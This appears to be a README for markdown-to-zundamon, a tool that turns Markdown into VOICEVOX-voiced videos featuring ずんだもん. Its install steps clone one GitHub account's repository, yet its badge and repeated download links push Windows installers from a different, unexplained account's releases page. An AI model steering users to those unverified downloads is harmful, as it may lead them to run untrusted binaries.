# 🎥 markdown-to-zundamon - Create Videos from Markdown Easily

[![Download markdown-to-zundamon](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)

---

## 📥 Download and Install

To use markdown-to-zundamon, you need to get the software first. The download page has all the available versions.  

Click the button below to visit the release page where you can download the app for Windows:

[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)

---

## 🖥️ What Is markdown-to-zundamon?

markdown-to-zundamon is a tool that turns your Markdown text into video explanations. It uses voice synthesis to make a character called "ずんだもん" speak your text. The video matches the structure of your Markdown file.  

This tool works by:  
- Showing quotes (blockquotes) as slides on the screen.  
- Turning other text into spoken lines by ずんだもん using VOICEVOX's voice engine.  
- Pausing at specific points when you write `[pause: 500ms]` or other pause commands.

You can create videos easily by simply writing Markdown, no video editing skills needed.

---

## 🛠️ Requirements

Before you start, make sure your PC has:  

- Windows 10 or later  
- Node.js version 18 or higher installed  
- VOICEVOX running on your PC (it should be running at the address `http://localhost:50021` by default)

VOICEVOX is responsible for turning text into speech. You need to have it installed and open before running markdown-to-zundamon.  

If you don’t have Node.js or VOICEVOX yet, you can find them here:  

- Node.js: https://nodejs.org/  
- VOICEVOX: https://voicevox.hiroshiba.jp/

---

## 🚀 How To Set Up markdown-to-zundamon

Follow these steps to get the tool working on your Windows machine:

1. Download the source code or package  
   You can get the official source from GitHub or clone the repository if you know how to use Git.  

2. Open the Command Prompt (press Windows + R, type `cmd`, and press Enter).

3. Install dependencies  
   Run the following commands to download and prepare the software:

   ```bash
   git clone https://github.com/motemen/markdown-to-zundamon.git
   cd markdown-to-zundamon
   npm install
   ```

   Alternatively, if you don’t want to clone the whole repo, run this shortcut:

   ```bash
   npx degit motemen/markdown-to-zundamon markdown-to-zundamon
   cd markdown-to-zundamon
   npm install
   ```

After installation finishes, the app is ready to use.

---

## 🎬 How To Use markdown-to-zundamon

The process to create videos with markdown-to-zundamon has two main steps:  

### 1. Generate Speech Audio from Markdown

Use this step to analyze your Markdown file and create audio clips. The command you run looks like this:

```bash
npm run preprocess -- <your-markdown-file.md>
```

Replace `<your-markdown-file.md>` with the path to your actual Markdown file.  

This command will:  
- Read and understand your Markdown  
- Use VOICEVOX to create speech files for spoken parts  
- Save the output and audio files in a folder named after your Markdown file (without the `.md` extension) under `public/projects/`

You must run this step first every time you change your Markdown.

---

### 2. Preview the Video Presentation

After creating audio files, you can preview how your video looks and sounds using the built-in studio:

```bash
npm run studio -- <project-name>
```

Replace `<project-name>` with the name of your Markdown file without extension.  

This will open a preview window to watch the video with the slides and voice playback.

---

## 💡 How markdown-to-zundamon Works

markdown-to-zundamon uses Markdown syntax as rules to build the video:  

- Text inside `>` blockquotes becomes slides on screen.  
- Other text outside blockquotes is converted into speech with ずんだもん’s voice.  
- You can add pauses using tags like `[pause: 500ms]`, which stops speech for that time.  

For example, this Markdown:

```markdown
> # Title Slide

Hello! I am ずんだもん.

> - Point 1
> - Point 2

I will explain this!
[pause: 500ms]
Here comes the next line.

> ![](./image.png)
```

Becomes slides and spoken text timed together as a video.

---

## ⚙️ Common Use Cases

- Making educational videos from notes.  
- Creating simple presentations with voiceovers.  
- Explaining ideas easily by writing Markdown.  

Even if you don’t know video editing, markdown-to-zundamon helps you produce polished videos by writing simple text.

---

## 🔧 Tips for Writing Markdown

- Use blockquotes `>` for slides that show bullets or images.  
- Write normal text for the voice script.  
- Insert `[pause: Xms]` to add short breaks between speech.  
- Name your Markdown files clearly; the project uses the filename to organize outputs.

---

## 🚩 Troubleshooting

- Ensure VOICEVOX is running before starting the tool.  
- Check Node.js version is 18 or higher (`node -v`).  
- Confirm your Markdown file path is correct when running commands.  
- If the preview does not start, check for errors in the command prompt.  

---

## 📥 Download markdown-to-zundamon  

Remember, to get the app you must visit the release page here:  

[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)

There you will find Windows installers or zipped packages that make setup easier for you.

---

## 🔄 Updating markdown-to-zundamon

When a new version comes out, repeat the download and install steps to get the latest features. Keep VOICEVOX updated separately to match any voice engine improvements.

---

## 📚 Further Information

For more technical details or advanced usage, check the project’s GitHub repository and documentation. You can find examples and additional command options there.

---

## ⚙️ System Requirements Reminder

- Windows 10 or newer  
- Node.js 18 or later  
- VOICEVOX voice engine running locally (`http://localhost:50021`)  

The combination of these lets markdown-to-zundamon process Markdown and produce videos with speech effectively.